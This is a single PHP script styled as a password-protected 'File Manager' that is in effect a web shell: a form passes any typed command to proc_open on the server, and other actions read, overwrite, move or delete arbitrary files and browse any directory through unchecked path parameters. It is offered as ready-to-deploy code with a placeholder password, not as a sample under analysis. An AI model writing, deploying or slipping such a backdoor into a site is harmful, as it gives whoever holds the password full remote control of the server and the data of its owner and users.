<?php
session_start();
$password = "your_password_here"; // CHANGE THIS

// Login check
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pwd']) && $_POST['pwd'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<form method="post">
            <input type="password" name="pwd" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>';
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Execute command using proc_open
function execute($cmd) {
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ];
    
    $process = proc_open($cmd, $descriptorspec, $pipes);
    if (!is_resource($process)) return "Failed to execute command";
    
    $output = stream_get_contents($pipes[1]);
    $error = stream_get_contents($pipes[2]);
    
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    
    return $error ? $error : $output;
}

// File operations
if (isset($_GET['action'])) {
    $path = $_GET['path'] ?? '';
    
    switch ($_GET['action']) {
        case 'read':
            if (is_file($path)) {
                header("Content-Type: text/plain");
                readfile($path);
                exit;
            }
            break;
            
        case 'edit':
            if (isset($_POST['content']) && is_writable($path)) {
                file_put_contents($path, $_POST['content']);
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            }
            break;
            
        case 'delete':
            if (is_file($path)) {
                unlink($path);
            } elseif (is_dir($path)) {
                execute("rm -rf " . escapeshellarg($path));
            }
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
            
        case 'move':
            if (isset($_POST['new_path']) && file_exists($path)) {
                rename($path, $_POST['new_path']);
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            }
            break;
    }
}

// Current directory
$dir = $_GET['dir'] ?? '.';
$files = scandir($dir);

// Display interface
echo '<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px }
        pre { background: #f0f0f0; padding: 10px }
        table { border-collapse: collapse; width: 100% }
        th, td { border: 1px solid #ddd; padding: 8px }
        th { background: #f2f2f2 }
    </style>
</head>
<body>
    <h2>File Manager <a href="?logout=1" style="float:right">Logout</a></h2>
    
    <form method="post">
        <input type="text" name="cmd" placeholder="Command" required>
        <input type="submit" value="Execute">
    </form>';

// Command execution
if (isset($_POST['cmd'])) {
    echo '<h3>Command Output:</h3><pre>' . htmlspecialchars(execute($_POST['cmd'])) . '</pre>';
}

// File listing
echo '<h3>Files in ' . htmlspecialchars($dir) . '</h3>
<table>
    <tr><th>Name</th><th>Size</th><th>Actions</th></tr>';

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    
    $filepath = $dir . '/' . $file;
    $is_dir = is_dir($filepath);
    
    echo '<tr>
        <td>' . ($is_dir ? '<b>' . htmlspecialchars($file) . '</b>' : htmlspecialchars($file)) . '</td>
        <td>' . ($is_dir ? '-' : filesize($filepath)) . '</td>
        <td>';
    
    if ($is_dir) {
        echo '<a href="?dir=' . urlencode($filepath) . '">Open</a> | ';
    } else {
        echo '<a href="?action=read&path=' . urlencode($filepath) . '">View</a> | ';
    }
    
    echo '<a href="#" onclick="editFile(\'' . urlencode($filepath) . '\')">Edit</a> | 
          <a href="#" onclick="moveFile(\'' . urlencode($filepath) . '\')">Move</a> | 
          <a href="?action=delete&path=' . urlencode($filepath) . '" onclick="return confirm(\'Delete?\')">Delete</a>
        </td>
    </tr>';
}

echo '</table>';

// Edit file modal
echo '<div id="editModal" style="display:none;position:fixed;top:50px;left:50%;transform:translateX(-50%);background:white;padding:20px;border:1px solid #ccc;z-index:1000">
    <h3>Edit File</h3>
    <form method="post" action="?action=edit">
        <input type="hidden" name="path" id="editPath">
        <textarea name="content" id="editContent" rows="20" style="width:500px"></textarea><br>
        <input type="submit" value="Save">
        <button type="button" onclick="document.getElementById(\'editModal\').style.display=\'none\'">Cancel</button>
    </form>
</div>';

// Move file modal
echo '<div id="moveModal" style="display:none;position:fixed;top:50px;left:50%;transform:translateX(-50%);background:white;padding:20px;border:1px solid #ccc;z-index:1000">
    <h3>Move File</h3>
    <form method="post" action="?action=move">
        <input type="hidden" name="path" id="movePath">
        New path: <input type="text" name="new_path" id="moveNewPath" style="width:400px"><br>
        <input type="submit" value="Move">
        <button type="button" onclick="document.getElementById(\'moveModal\').style.display=\'none\'">Cancel</button>
    </form>
</div>';

// JavaScript functions
echo '<script>
function editFile(path) {
    fetch("?action=read&path=" + encodeURIComponent(path))
        .then(response => response.text())
        .then(content => {
            document.getElementById("editPath").value = path;
            document.getElementById("editContent").value = content;
            document.getElementById("editModal").style.display = "block";
        });
}

function moveFile(path) {
    document.getElementById("movePath").value = path;
    document.getElementById("moveNewPath").value = path;
    document.getElementById("moveModal").style.display = "block";
}
</script>';

echo '</body></html>';